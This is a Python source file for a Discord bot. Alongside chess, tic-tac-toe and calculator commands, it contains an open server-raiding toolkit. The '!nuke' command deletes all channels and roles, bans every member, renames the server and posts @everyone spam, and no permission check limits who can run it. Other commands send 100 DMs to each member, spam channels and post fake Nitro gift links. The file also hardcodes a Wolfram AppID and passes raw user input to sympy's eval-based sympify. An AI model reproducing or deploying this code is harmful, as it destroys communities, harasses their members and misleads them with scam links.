import os
import certifi
import discord
from discord import app_commands
from discord.ext import commands
import subprocess
import requests
from collections import defaultdict
import random
import asyncio
import string
import copy
import chess
import sympy

# --- ENV SETUP ---
os.environ['SSL_CERT_FILE'] = certifi.where()

# --- CONFIG ---
TOKEN = "Bot_token"
WOLFRAM_APPID = "6JP9U2AAW4"
QALCULATE_PATH = "/data/data/com.termux/files/usr/bin/qalc"

# --- INTENTS / BOT Setup ---
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree
user_inputs = defaultdict(list)
active_games = {}

# --- Chess board render ---
def render_text_board(board):
    unicode_pieces = {
        "r": "♜", "n": "♞", "b": "♝", "q": "♛", "k": "♚", "p": "♟",
        "R": "♖", "N": "♘", "B": "♗", "Q": "♕", "K": "♔", "P": "♙", None: "·"
    }
    rows = []
    for i in range(8):
        row = ""
        for j in range(8):
            square = chess.square(j, 7 - i)
            piece = board.piece_at(square)
            row += unicode_pieces.get(str(piece) if piece else None, "·") + " "
        rows.append(row)
    return "\n".join(rows)

# --- CHESS GAME ---
@tree.command(name="chess", description="Challenge someone to a chess match")
@app_commands.describe(opponent="The user you want to challenge")
async def chess_game(interaction: discord.Interaction, opponent: discord.User):
    if opponent == interaction.user:
        await interaction.response.send_message("You can't challenge yourself!", ephemeral=True)
        return

    key = frozenset({interaction.user.id, opponent.id})
    if key in active_games:
        await interaction.response.send_message("You already have a game ongoing.", ephemeral=True)
        return

    board = chess.Board()
    active_games[key] = {
        "board": board,
        "white": interaction.user.id,
        "black": opponent.id
    }

    board_text = render_text_board(board)
    await interaction.response.send_message(
        f"♟️ {interaction.user.mention} (White) vs {opponent.mention} (Black) — Game started!\n"
        f"{interaction.user.mention}, your move!\n``````"
    )

@bot.command()
async def move(ctx, move: str):
    key = None
    for k in active_games:
        if ctx.author.id in k:
            key = k
            break

    if not key:
        await ctx.send("You're not in a game.")
        return

    game = active_games[key]
    board = game["board"]
    turn_id = game["white"] if board.turn == chess.WHITE else game["black"]

    if ctx.author.id != turn_id:
        await ctx.send("It's not your turn.")
        return

    try:
        move_obj = chess.Move.from_uci(move)
        if move_obj not in board.legal_moves:
            raise ValueError("Illegal move")
        board.push(move_obj)
    except Exception:
        await ctx.send("Invalid move! Use UCI notation like `e2e4`.")
        return

    board_text = render_text_board(board)

    if board.is_checkmate():
        await ctx.send(f"Checkmate! <@{ctx.author.id}> wins!\n``````")
        del active_games[key]
    elif board.is_stalemate():
        await ctx.send(f"Stalemate! It's a draw.\n``````")
        del active_games[key]
    elif board.is_insufficient_material():
        await ctx.send(f"Draw due to insufficient material.\n``````")
        del active_games[key]
    else:
        next_id = game["white"] if board.turn == chess.WHITE else game["black"]
        await ctx.send(f"<@{next_id}>, it's your move!\n``````")

@bot.command()
async def resign(ctx):
    key = None
    for k in active_games:
        if ctx.author.id in k:
            key = k
            break
    if not key:
        await ctx.send("You're not in any game.")
        return

    del active_games[key]
    await ctx.send(f"{ctx.author.mention} resigned. Game over.")

# --- CALCULATORS ---
async def send_long_message(interaction, title, expression, result):
    try:
        if not result:
            result = "(No output)"
        wrap_start = "```\n"
        wrap_end = "\n```"
        max_chunk = 2000 - len(wrap_start) - len(wrap_end)
        chunks = [result[i:i + max_chunk] for i in range(0, len(result), max_chunk)]
        for chunk in chunks:
            await interaction.followup.send(f"{wrap_start}{chunk}{wrap_end}")
    except Exception as e:
        print("❌ Error sending chunk:", e)
        await interaction.followup.send("❌ Output too long or failed.")

def qalc(expression: str) -> str:
    try:
        result = subprocess.run([QALCULATE_PATH, expression], capture_output=True, text=True, input="y")
        return result.stdout.strip()
    except Exception as e:
        return f"Error: {str(e)}"

def wolfram_query(expression: str) -> str:
    try:
        url = "http://api.wolframalpha.com/v2/query"
        params = {"input": expression, "appid": WOLFRAM_APPID, "output": "JSON"}
        response = requests.get(url, params=params)
        data = response.json()
        pods = data.get("queryresult", {}).get("pods", [])
        for pod in pods:
            if pod["title"].lower() in ["result", "solution", "exact result", "definite integral"]:
                return pod["subpods"][0]["plaintext"]
        if pods:
            return pods[0]["subpods"][0]["plaintext"]
        return "No answer found."
    except Exception as e:
        return f"Error contacting Wolfram Alpha: {str(e)}"

@tree.command(name="calc", description="Calculate using Qalculate CLI")
async def calc(interaction: discord.Interaction, expression: str):
    await interaction.response.defer()
    await send_long_message(interaction, "", "", qalc(expression))

@tree.command(name="wolf", description="Ask Wolfram Alpha")
async def wolf(interaction: discord.Interaction, question: str):
    await interaction.response.defer()
    await send_long_message(interaction, "", "", wolfram_query(question))

# --- SPAM ---
@tree.command(name='spam', description='Spam a message')
async def spam(interaction: discord.Interaction, amount: int, delay: float = 0.5, message: str = 'Spam'):
    await interaction.response.send_message(f'Spamming {amount} messages…')
    for _ in range(amount):
        await interaction.channel.send(message)
        await asyncio.sleep(delay)

@tree.command(name='randomspam', description='Spam random messages (use | separator)')
async def randomspam(interaction: discord.Interaction, amount: int, delay: float = 0.5, messages: str = ''):
    msg_list = messages.split('|')
    await interaction.response.send_message(f"Sending random messages…")
    for _ in range(amount):
        await interaction.channel.send(random.choice(msg_list))
        await asyncio.sleep(delay)

@tree.command(name='embedspam', description='Spam embedded messages')
async def embedspam(interaction: discord.Interaction, amount: int, delay: float = 0.5, title: str = 'Spam', description: str = 'This is spam'):
    await interaction.response.send_message(f"Sending embeds…")
    for _ in range(amount):
        embed = discord.Embed(title=title, description=description, color=0xff0000)
        await interaction.channel.send(embed=embed)
        await asyncio.sleep(delay)

# --- TICTACTOE ---
EMPTY = "⬜"
PLAYER = "❌"
AI = "⭕"

class TicTacToe:
    def __init__(self):
        self.board = [EMPTY] * 9
        self.current_turn = PLAYER

    def display_board(self):
        return "\n".join("".join(self.board[i:i+3]) for i in range(0, 9, 3))

    def get_valid_moves(self):
        return [i for i, val in enumerate(self.board) if val == EMPTY]

    def make_move(self, index, symbol):
        self.board[index] = symbol

    def check_winner(self, symbol):
        lines = [
            [0, 1, 2], [3, 4, 5], [6, 7, 8],
            [0, 3, 6], [1, 4, 7], [2, 5, 8],
            [0, 4, 8], [2, 4, 6]
        ]
        return any(all(self.board[i] == symbol for i in line) for line in lines)

    def is_full(self):
        return EMPTY not in self.board

def minimax(game, depth, maximizing):
    if game.check_winner(AI): return 1
    if game.check_winner(PLAYER): return -1
    if game.is_full(): return 0

    if maximizing:
        best_score = -float("inf")
        for m in game.get_valid_moves():
            g = copy.deepcopy(game)
            g.make_move(m, AI)
            score = minimax(g, depth + 1, False)
            best_score = max(best_score, score)
        return best_score
    else:
        best_score = float("inf")
        for m in game.get_valid_moves():
            g = copy.deepcopy(game)
            g.make_move(m, PLAYER)
            score = minimax(g, depth + 1, True)
            best_score = min(best_score, score)
        return best_score

def get_best_move(game):
    best_score = -float("inf")
    move = None
    for m in game.get_valid_moves():
        g = copy.deepcopy(game)
        g.make_move(m, AI)
        score = minimax(g, 0, False)
        if score > best_score:
            best_score, move = score, m
    return move

@tree.command(name="tictactoe", description="Play Tic Tac Toe vs AI!")
async def tictactoe(interaction: discord.Interaction):
    game = TicTacToe()
    active_games[interaction.user.id] = game
    await interaction.response.send_message(
        f"🎮 Tic Tac Toe vs AI!\nYou're {PLAYER}, computer is {AI}.\nUse `/place <1-9>`\n\n{game.display_board()}")

@tree.command(name="place", description="Place your move on board (1-9)")
@app_commands.describe(position="Position from 1 to 9")
async def place(interaction: discord.Interaction, position: int):
    uid = interaction.user.id
    if uid not in active_games:
        await interaction.response.send_message("❌ Start with `/tictactoe`", ephemeral=True)
        return

    game = active_games[uid]
    index = position - 1
    if index not in game.get_valid_moves():
        await interaction.response.send_message("❌ Invalid spot", ephemeral=True)
        return

    # Player move
    game.make_move(index, PLAYER)
    if game.check_winner(PLAYER):
        msg = game.display_board() + "\n✅ You win!"
        del active_games[uid]
        await interaction.response.send_message(msg)
        return

    if game.is_full():
        msg = game.display_board() + "\n⚖️ It's a draw!"
        del active_games[uid]
        await interaction.response.send_message(msg)
        return

    # AI move
    ai_index = get_best_move(game)
    game.make_move(ai_index, AI)
    if game.check_winner(AI):
        msg = game.display_board() + "\n💀 AI wins!"
        del active_games[uid]
        await interaction.response.send_message(msg)
        return

    await interaction.response.send_message(f"{game.display_board()}\nYour turn! Use `/place <1-9>`.")

# === NEW NUKE COMMAND (NERD 2.0) ===
SPAM_MESSAGE = "@everyone 💥 Get nuked by Nerd 2.0 💥"
SPAM_CHANNEL_NAME = "nerd-nuked"
DM_SPAM_MESSAGE = "💣 This is a DM spam test from Nerd 2.0. Stay nuked!"
DM_SPAM_COUNT = 100
SPAM_CHANNEL_COUNT = 5
NUKED_SERVER_NAME = "☢️ NUKED BY NERD 2.0 ☢️"

@bot.command(name='nuke')
async def nuke(ctx):
    await ctx.send("🚨 Starting nuke sequence...")

    guild = ctx.guild

    for channel in guild.channels:
        try:
            await channel.delete()
        except: pass

    for role in guild.roles:
        try:
            if role >= guild.me.top_role or role.is_default():
                continue
            await role.delete()
        except: pass

    for member in guild.members:
        try:
            if member == ctx.author or member == bot.user:
                continue
            await member.ban(reason="Nuked by Nerd 2.0")
        except: pass

    try:
        await guild.edit(name=NUKED_SERVER_NAME)
    except: pass

    for i in range(SPAM_CHANNEL_COUNT):
        try:
            ch = await guild.create_text_channel(f"{SPAM_CHANNEL_NAME}-{i+1}")
            await ch.send(SPAM_MESSAGE)
        except: pass

    await ctx.send("🔥 Nuke complete.")

@bot.command()
async def spamdm(ctx):
    await ctx.send("📨 Starting 100x DM spam per member...")
    for member in ctx.guild.members:
        if member.bot or member == bot.user:
            continue
        for i in range(DM_SPAM_COUNT):
            try:
                await member.send(f"📩 [{i+1}/{DM_SPAM_COUNT}] {DM_SPAM_MESSAGE}")
                await asyncio.sleep(0.5)
            except:
                break
    await ctx.send("✅ Finished DM spam.")

@bot.command(name="nitro")
async def nitro(ctx):
    link = f"https://discord.gift/{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
    await ctx.send(f"Here's your 'Nitro' link: {link}")

@bot.command(name="echo")
async def echo(ctx, *, message: str):
    try:
        await ctx.message.delete()  # Delete original user message if possible
    except Exception:
        pass
    await ctx.send(message)

JOKES = ["Why don't scientists trust atoms? Because they make up everything!", "What did the zero say to the eight? Nice belt!"] + [f"Joke #{i}" for i in range(3, 101)]
FACTS = ["Bananas are berries, but strawberries aren't.", "Honey never spoils."] + [f"Fact #{i}" for i in range(3, 101)]
TIPS = ["Drink water regularly.", "Set achievable goals."] + [f"Tip #{i}" for i in range(3, 101)]

# --- ON_MESSAGE & Calculator Fusion ---
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    uid = message.author.id
    content = message.content.strip()

    # Step 1: Catch both .Calc and regular multi-line user input
    if content.startswith(".Calc "):
        user_inputs[uid] = [content[6:]]
        await message.channel.send("📝 Send more or type `Evaluate`")
        return

    # Both Multi-Line Mode and Normal Input Mode
    if uid in user_inputs:
        if content.lower() == "evaluate":
            expr = "".join(user_inputs[uid])
            del user_inputs[uid]
            # SYMPY/CUSTOM EXECUTION
            if expr.lower().startswith("sympy"):
                expr_to_eval = expr[len("sympy"):].strip()
                try:
                    result = str(sympy.sympify(expr_to_eval))
                except Exception as e:
                    result = f"SymPy Error: {e}"
            elif expr.lower().startswith("tower"):
                to_eval = expr[len("tower"):].strip()
                proc = subprocess.run(["./superqalc_tower"], input=to_eval.encode(), capture_output=True)
                result = proc.stdout.decode() if proc.returncode == 0 else "Error running superqalc."
            else:
                proc = subprocess.run(["./superqalc_onefile"], input=expr.encode(), capture_output=True)
                result = proc.stdout.decode() if proc.returncode == 0 else "Error running superqalc."
            # Split and send if > 2000 chars
            for chunk_start in range(0, len(result), 2000):
                await message.channel.send(result[chunk_start:chunk_start + 2000])
        else:
            user_inputs[uid].append(content)
        return

    # Simple quick one-liners
    if content == ".joke": await message.channel.send(random.choice(JOKES))
    if content == ".fact": await message.channel.send(random.choice(FACTS))
    if content == ".tip": await message.channel.send(random.choice(TIPS))

    await bot.process_commands(message)

# --- SYNC SLASH COMMANDS ---
@bot.event
async def on_ready():
    synced = await tree.sync()
    print(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")
    print(f"✅ Synced {len(synced)} global slash commands!")

# --- ERROR HANDLER ---
@bot.event
async def on_command_error(ctx, error):
    await ctx.send(f"❌ Error: {error}")

# --- RUN BOT ---
bot.run(TOKEN)

